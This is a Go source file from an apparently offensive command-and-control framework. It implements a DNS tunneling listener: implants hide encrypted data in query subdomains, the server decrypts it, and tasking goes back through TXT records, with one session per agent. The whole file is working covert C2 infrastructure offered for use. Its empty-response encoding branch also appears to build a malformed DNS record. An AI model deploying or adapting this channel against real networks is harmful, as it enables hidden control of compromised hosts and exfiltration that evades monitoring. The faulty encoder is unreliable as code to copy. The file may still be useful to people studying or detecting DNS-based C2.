package transport

import (
	"encoding/base64"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/Ruby570bocadito/WorldC2/src/go/internal/crypto"
)

// DNSListener implements encrypted DNS tunneling.
// Agents encode encrypted data in A/AAAA queries, server responds via TXT records.
type DNSListener struct {
	conn     *net.UDPConn
	domains  []string
	sessions map[string]*dnsSession
	mu       sync.RWMutex
	acceptCh chan *dnsConn
	quit     chan struct{}

	// Encryption
	encKey []byte
}

type dnsSession struct {
	id            string
	lastSeenNanos atomic.Int64
	upQueue       chan []byte
	downQueue     chan []byte
	seq           uint16
}

const dnsSessionIdleTimeout = 15 * time.Minute // reaper bound for abandoned sessions

// dnsConn wraps a DNS session as a net.Conn. It keeps a back-pointer to the
// listener so Close() (invoked by the C2 layer when the session ends) removes
// the session from the map — without it every dead agent leaked its session
// and both 256-slot queues forever.
//
// Read buffers partial up-queue entries: one entry can hold a whole upstream
// query payload (~150 bytes) while callers often read 4-byte length prefixes;
// without the buffer the remainder of the entry would be dropped and the
// length-prefixed stream would corrupt.
type dnsConn struct {
	ln      *DNSListener
	session *dnsSession

	mu      sync.Mutex
	pend    []byte
	pendOff int
}

// NewDNSListener creates an encrypted DNS tunneling listener.
func NewDNSListener(addr string, domains []string, encKey []byte) (*DNSListener, error) {
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return nil, fmt.Errorf("resolve: %w", err)
	}

	conn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		return nil, fmt.Errorf("listen: %w", err)
	}

	return &DNSListener{
		conn:     conn,
		domains:  domains,
		sessions: make(map[string]*dnsSession),
		acceptCh: make(chan *dnsConn, 32),
		quit:     make(chan struct{}),
		encKey:   encKey,
	}, nil
}

// Start begins processing DNS queries.
func (l *DNSListener) Start() {
	go func() {
		// Generous buffer: long configured domains produce queries larger
		// than the classic 512-byte DNS datagram.
		buf := make([]byte, 65535)
		for {
			select {
			case <-l.quit:
				return
			default:
			}

			n, addr, err := l.conn.ReadFromUDP(buf)
			if err != nil {
				continue
			}

			// Handle inline (not in a goroutine): UDP packets for the same
			// session must be processed FIFO or the tunnel reorders bytes.
			l.handleQuery(buf[:n], addr)
		}
	}()

	// Session reaper: drops sessions whose source address went silent
	// (abandoned before the C2 layer ever accepted them, or after a Close
	// that raced with in-flight packets).
	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()
		for {
			select {
			case <-l.quit:
				return
			case <-ticker.C:
				cutoff := time.Now().Add(-dnsSessionIdleTimeout).UnixNano()
				l.mu.Lock()
				for id, sess := range l.sessions {
					if sess.lastSeenNanos.Load() < cutoff {
						delete(l.sessions, id)
					}
				}
				l.mu.Unlock()
			}
		}
	}()
}

func (l *DNSListener) handleQuery(data []byte, addr *net.UDPAddr) {
	if len(data) < 12 {
		return
	}

	// Extract query name
	qname := extractDNSName(data, 12)
	if qname == "" {
		return
	}

	// Check domain match
	matched := false
	for _, d := range l.domains {
		if len(qname) > len(d) && qname[len(qname)-len(d):] == d {
			matched = true
			break
		}
	}
	if !matched {
		return
	}

	// Decode and decrypt data from subdomain
	subdomain := qname[:len(qname)-len(l.matchedDomain(qname))-1]
	encrypted := decodeDNSSubdomain(subdomain)

	// Decrypt
	var decrypted []byte
	if len(l.encKey) > 0 && len(encrypted) > crypto.NonceSize {
		var err error
		decrypted, err = crypto.Decrypt(l.encKey, encrypted)
		if err != nil {
			return
		}
	} else {
		decrypted = encrypted
	}

	// Session management
	sessionID := addr.String()
	l.mu.Lock()
	sess, ok := l.sessions[sessionID]
	if !ok {
		sess = &dnsSession{
			id:        sessionID,
			upQueue:   make(chan []byte, 256),
			downQueue: make(chan []byte, 256),
		}
		sess.lastSeenNanos.Store(time.Now().UnixNano())
		l.sessions[sessionID] = sess

		select {
		case l.acceptCh <- &dnsConn{ln: l, session: sess}:
		default:
		}
	}
	l.mu.Unlock()

	// Queue upstream data
	select {
	case sess.upQueue <- decrypted:
	default:
	}

	sess.lastSeenNanos.Store(time.Now().UnixNano())

	// Get downstream data
	var response []byte
	select {
	case resp := <-sess.downQueue:
		response = resp
	default:
		response = []byte{}
	}

	// Encrypt response
	var respData []byte
	if len(l.encKey) > 0 && len(response) > 0 {
		encrypted, err := crypto.Encrypt(l.encKey, response)
		if err == nil {
			respData = encrypted
		} else {
			respData = response
		}
	} else {
		respData = response
	}

	// Build and send DNS response
	resp := buildDNSResponse(data, respData)
	if resp != nil {
		l.conn.WriteToUDP(resp, addr)
	}
}

func (l *DNSListener) matchedDomain(qname string) string {
	for _, d := range l.domains {
		if len(qname) > len(d) && qname[len(qname)-len(d):] == d {
			return d
		}
	}
	return ""
}

// Accept returns the next DNS tunneling connection.
func (l *DNSListener) Accept() (net.Conn, error) {
	select {
	case conn := <-l.acceptCh:
		return conn, nil
	case <-l.quit:
		return nil, fmt.Errorf("listener closed")
	}
}

// Close shuts down the DNS listener.
func (l *DNSListener) Close() error {
	close(l.quit)
	return l.conn.Close()
}

// Addr returns the listener's address.
func (l *DNSListener) Addr() net.Addr {
	return l.conn.LocalAddr()
}

// --- dnsConn implements net.Conn ---

func (c *dnsConn) Read(b []byte) (int, error) {
	c.mu.Lock()
	if c.pendOff < len(c.pend) {
		n := copy(b, c.pend[c.pendOff:])
		c.pendOff += n
		c.mu.Unlock()
		return n, nil
	}
	c.mu.Unlock()

	for {
		select {
		case data := <-c.session.upQueue:
			if len(data) == 0 {
				// Empty entry from an idle poll query — not stream data.
				continue
			}
			c.mu.Lock()
			c.pend = data
			c.pendOff = 0
			n := copy(b, c.pend[c.pendOff:])
			c.pendOff += n
			c.mu.Unlock()
			return n, nil
		case <-time.After(5 * time.Minute):
			return 0, fmt.Errorf("dns read timeout")
		}
	}
}

func (c *dnsConn) Write(b []byte) (int, error) {
	select {
	case c.session.downQueue <- b:
		return len(b), nil
	default:
		return 0, fmt.Errorf("dns write queue full")
	}
}

// Close removes the session from the listener map so dead agent endpoints do
// not leak their (up to 2×256-slot) queues. Subsequent packets from the same
// address simply create a fresh session.
func (c *dnsConn) Close() error {
	if c.ln != nil {
		c.ln.mu.Lock()
		if cur, ok := c.ln.sessions[c.session.id]; ok && cur == c.session {
			delete(c.ln.sessions, c.session.id)
		}
		c.ln.mu.Unlock()
	}
	return nil
}
func (c *dnsConn) LocalAddr() net.Addr                { return &net.UDPAddr{IP: net.IPv4zero, Port: 53} }
func (c *dnsConn) RemoteAddr() net.Addr               { return &net.UDPAddr{IP: net.IPv4zero, Port: 53} }
func (c *dnsConn) SetDeadline(t time.Time) error      { return nil }
func (c *dnsConn) SetReadDeadline(t time.Time) error  { return nil }
func (c *dnsConn) SetWriteDeadline(t time.Time) error { return nil }

// --- DNS encoding helpers ---

func extractDNSName(data []byte, offset int) string {
	var name string
	for {
		if offset >= len(data) {
			break
		}
		length := int(data[offset])
		if length == 0 {
			break
		}
		if length&0xC0 == 0xC0 {
			break
		}
		offset++
		if offset+length > len(data) {
			break
		}
		if len(name) > 0 {
			name += "."
		}
		name += string(data[offset : offset+length])
		offset += length
	}
	return name
}

// decodeDNSSubdomain decodes the payload labels of a query name. The FIRST
// label is the client session id and is not part of the payload.
func decodeDNSSubdomain(subdomain string) []byte {
	labels := splitLabels(subdomain)
	if len(labels) < 2 {
		return nil
	}
	var result []byte
	for _, label := range labels[1:] {
		b, err := base64Decode(label)
		if err == nil {
			result = append(result, b...)
		}
	}
	return result
}

func splitLabels(s string) []string {
	var labels []string
	for _, label := range splitBy(s, '.') {
		if len(label) > 0 {
			labels = append(labels, label)
		}
	}
	return labels
}

func splitBy(s string, sep byte) []string {
	var parts []string
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == sep {
			parts = append(parts, s[start:i])
			start = i + 1
		}
	}
	parts = append(parts, s[start:])
	return parts
}

func base64Decode(s string) ([]byte, error) {
	// Client encodes raw (unpadded) URL-safe base64.
	return base64.RawURLEncoding.DecodeString(s)
}

func buildDNSResponse(query []byte, data []byte) []byte {
	if len(query) < 12 {
		return nil
	}

	// Pre-compute the TXT payload size so the buffer can never overflow.
	totalLen := 0
	if len(data) > 0 {
		for i := 0; i < len(data); i += 255 {
			chunk := data[i:]
			if len(chunk) > 255 {
				chunk = chunk[:255]
			}
			totalLen += 1 + len(chunk)
		}
	} else {
		totalLen = 1 // single empty string
	}

	resp := make([]byte, len(query)+12+totalLen)
	copy(resp, query)

	// Set QR=1, RD=1, RA=1
	resp[2] = 0x81
	resp[3] = 0x80

	// ANCOUNT = 1
	resp[6] = 0x00
	resp[7] = 0x01

	// Find end of question
	offset := 12
	for offset < len(query) {
		if query[offset] == 0 {
			offset++
			break
		}
		offset += int(query[offset]) + 1
	}
	offset += 4 // QTYPE + QCLASS

	// Answer: name pointer
	resp[offset] = 0xC0
	resp[offset+1] = 12
	offset += 2

	// TYPE: TXT (16)
	resp[offset] = 0x00
	resp[offset+1] = 0x10
	offset += 2

	// CLASS: IN
	resp[offset] = 0x00
	resp[offset+1] = 0x01
	offset += 2

	// TTL: 0
	resp[offset] = 0x00
	resp[offset+1] = 0x00
	resp[offset+2] = 0x00
	resp[offset+3] = 0x00
	offset += 4

	// Encode data as TXT record
	if len(data) > 0 {
		// Split into chunks of 255 bytes
		totalLen := 0
		for i := 0; i < len(data); i += 255 {
			chunk := data[i:]
			if len(chunk) > 255 {
				chunk = chunk[:255]
			}
			totalLen += 1 + len(chunk)
		}

		rdlengthOffset := offset
		offset += 2

		for i := 0; i < len(data); i += 255 {
			chunk := data[i:]
			if len(chunk) > 255 {
				chunk = chunk[:255]
			}
			resp[offset] = byte(len(chunk))
			offset++
			copy(resp[offset:], chunk)
			offset += len(chunk)
		}

		rdlen := offset - rdlengthOffset - 2
		resp[rdlengthOffset] = byte(rdlen >> 8)
		resp[rdlengthOffset+1] = byte(rdlen)
	} else {
		// Empty TXT
		resp[offset] = 0x00
		offset += 1
		resp[offset-2] = 0x00
		resp[offset-1] = 0x01
	}

	return resp[:offset]
}
